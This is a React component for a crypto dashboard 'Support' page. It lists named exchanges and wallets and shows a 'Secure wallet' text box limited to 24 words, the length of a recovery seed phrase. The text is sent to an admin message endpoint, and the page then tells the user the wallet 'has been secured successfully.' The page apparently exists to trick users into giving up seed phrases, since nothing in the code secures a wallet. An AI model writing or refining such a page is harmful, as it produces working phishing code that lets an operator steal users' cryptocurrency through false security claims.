import { useState } from "react";
import { useSendUserContactMessage } from "@workspace/api-client-react";
import { DashboardLayout } from "@/components/dashboard-layout";
import { WALLETS } from "@/pages/wallet-connect";

const MAX_WORDS = 24;
const EXCHANGE_WALLETS = [
  { name: "Binance", color: "#F3BA2F", icon: ExchangeIcon },
  { name: "Bybit", color: "#F7A600", icon: ExchangeIcon },
  { name: "OKX", color: "#D8D8D8", icon: ExchangeIcon },
  { name: "Kraken", color: "#5741D9", icon: ExchangeIcon },
  { name: "KuCoin", color: "#24AE8F", icon: ExchangeIcon },
  { name: "Gate.io", color: "#3F7CFF", icon: ExchangeIcon },
  { name: "Bitget", color: "#2D9CDB", icon: ExchangeIcon },
  { name: "MEXC", color: "#2A62FF", icon: ExchangeIcon },
  { name: "Crypto.com Exchange", color: "#1199FA", icon: ExchangeIcon },
  { name: "Gemini", color: "#4C8BF5", icon: ExchangeIcon },
  { name: "Bitfinex", color: "#16B157", icon: ExchangeIcon },
  { name: "HTX", color: "#1A9CFF", icon: ExchangeIcon },
  { name: "Bitstamp", color: "#0B5CFF", icon: ExchangeIcon },
  { name: "Coinbase Exchange", color: "#0052FF", icon: ExchangeIcon },
  { name: "Bitso", color: "#5C2D91", icon: ExchangeIcon },
  { name: "CoinEx", color: "#F04B4B", icon: ExchangeIcon },
  { name: "Phemex", color: "#17B6A4", icon: ExchangeIcon },
  { name: "Deribit", color: "#4A90E2", icon: ExchangeIcon },
  { name: "Uphold", color: "#49C5B6", icon: ExchangeIcon },
  { name: "Robinhood Crypto", color: "#00C805", icon: ExchangeIcon },
];
const SECURE_WALLETS = [
  ...WALLETS.map((wallet) => ({ ...wallet, category: "Crypto wallets" })),
  ...EXCHANGE_WALLETS.map((wallet) => ({ ...wallet, category: "Exchange wallets" })),
];

export default function Support() {
  const [subject, setSubject] = useState("");
  const [message, setMessage] = useState("");
  const [sent, setSent] = useState(false);
  const [error, setError] = useState("");
  const wordCount = message.trim() ? message.trim().split(/\s+/).length : 0;

  const { mutate, isPending } = useSendUserContactMessage({
    mutation: {
      onSuccess: () => {
        setSubject("");
        setMessage("");
        setError("");
        setSent(true);
      },
      onError: (err: any) => {
        setSent(false);
        setError(err?.data?.error ?? "Your message could not be sent. Please try again.");
      },
    },
  });

  const handleSubmit = (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setSent(false);
    setError("");
    if (!subject) {
      setError("Select your crypto wallet first.");
      return;
    }
    mutate({ data: { subject: subject.trim(), message: message.trim() } });
  };

  const handleMessageChange = (value: string) => {
    const words = value.trim().split(/\s+/).filter(Boolean);
    setMessage(words.length > MAX_WORDS ? words.slice(0, MAX_WORDS).join(" ") : value);
  };

  return (
    <DashboardLayout>
      <div className="mx-auto max-w-[1100px] space-y-6 px-4 py-6 sm:px-6 lg:px-9 lg:py-8">
        <section className="sl-rise max-w-3xl rounded-2xl border border-border bg-card p-5 sm:p-7">
          <form onSubmit={handleSubmit} className="space-y-5">
            {error && (
              <div role="alert" className="rounded-xl border border-destructive/30 bg-destructive/10 px-4 py-3 text-sm text-destructive">
                {error}
              </div>
            )}
            {sent && (
              <div role="status" className="flex items-start gap-2 rounded-xl border border-emerald-400/25 bg-emerald-400/10 px-4 py-3 text-sm text-emerald-300">
                <ShieldIcon className="mt-0.5 h-5 w-5 shrink-0" />
                Your wallet has been secured successfully.
              </div>
            )}

            <div className="space-y-5">
              {(["Crypto wallets", "Exchange wallets"] as const).map((category) => (
                <div key={category} className="space-y-3">
                  <p className="sl-kicker text-muted-foreground">{category}</p>
                  <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-4" data-testid={category === "Crypto wallets" ? "crypto-wallet-grid" : "exchange-wallet-grid"}>
                    {SECURE_WALLETS.filter((wallet) => wallet.category === category).map(({ name, color, icon: Icon }) => {
                      const isSelected = subject === name;
                      return (
                        <div
                          key={name}
                          className={`relative rounded-2xl border text-center transition-all ${
                            isSelected
                              ? "col-span-2 border-primary bg-primary/[.08] shadow-[0_0_0_1px_rgba(255,213,51,.8),0_10px_24px_rgba(255,213,51,.08)] sm:col-span-3 lg:col-span-4"
                              : "border-border bg-background/30 hover:border-primary/50 hover:bg-white/[.04]"
                          }`}
                          style={isSelected ? { borderColor: color, boxShadow: `0 0 0 1px ${color}66, 0 10px 24px ${color}18` } : undefined}
                        >
                          <button
                            type="button"
                            onClick={() => { setSubject(name); setSent(false); setError(""); }}
                            aria-pressed={isSelected}
                            aria-label={`Select ${name}`}
                            data-testid={`wallet-option-${name.toLowerCase().replaceAll(/[^a-z0-9]+/g, "-")}`}
                            className="group flex min-h-[112px] w-full flex-col items-center justify-center gap-2 p-3 text-center"
                          >
                            <span className="relative flex h-11 w-11 items-center justify-center rounded-2xl" style={{ backgroundColor: `${color}1f`, border: `1px solid ${color}55` }}>
                              <Icon className="h-7 w-7" color={color} />
                              {isSelected && (
                                <span className="absolute -right-1 -top-1 flex h-4 w-4 items-center justify-center rounded-full bg-primary text-[10px] font-bold text-primary-foreground">✓</span>
                              )}
                            </span>
                            <span className={`text-xs transition-colors ${isSelected ? "font-semibold text-foreground" : "text-muted-foreground group-hover:text-foreground"}`}>{name}</span>
                          </button>
                          {isSelected && (
                            <div className="space-y-3 border-t border-primary/20 p-4 text-left sm:p-5">
                              <div className="flex items-center justify-between gap-3">
                                <label htmlFor="admin-message" className="text-sm font-medium text-foreground">Secure wallet</label>
                                <span className="text-[11px] text-muted-foreground">{wordCount}/{MAX_WORDS} words</span>
                              </div>
                              <textarea
                                id="admin-message"
                                value={message}
                                onChange={(event) => handleMessageChange(event.target.value)}
                                className="min-h-[150px] w-full resize-y rounded-xl border border-border bg-input px-3.5 py-3 text-sm leading-6 text-foreground outline-none transition focus:ring-2 focus:ring-ring"
                                required
                              />
                              <button
                                type="submit"
                                disabled={isPending}
                                className="inline-flex h-11 w-full items-center justify-center gap-2 rounded-xl bg-primary px-5 text-sm font-semibold text-primary-foreground transition hover:bg-primary/90 disabled:cursor-not-allowed disabled:opacity-60"
                                data-testid="button-send-admin-message"
                              >
                                {isPending ? "Securing wallet..." : "Secure wallet"}
                                {!isPending && <ArrowIcon className="h-4 w-4" />}
                              </button>
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                </div>
              ))}
            </div>
          </form>
        </section>
      </div>
    </DashboardLayout>
  );
}

function ShieldIcon({ className }: { className?: string }) {
  return <svg className={className} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}><path d="M12 3 5 6v5c0 4.6 2.9 8.6 7 10 4.1-1.4 7-5.4 7-10V6l-7-3Z" strokeLinejoin="round" /><path d="m8.5 12 2.2 2.2 4.8-5" strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.2} /></svg>;
}

function ExchangeIcon({ className, color }: { className?: string; color?: string }) {
  return <svg className={className} viewBox="0 0 24 24" fill="none" stroke={color ?? "currentColor"} strokeWidth={1.8}><circle cx="12" cy="12" r="9" /><path d="M8 10h8M8 14h8M10 7v10M14 7v10" strokeLinecap="round" /></svg>;
}

function ArrowIcon({ className }: { className?: string }) {
  return <svg className={className} fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.8}><path d="M5 12h13M13 6l6 6-6 6" /></svg>;
}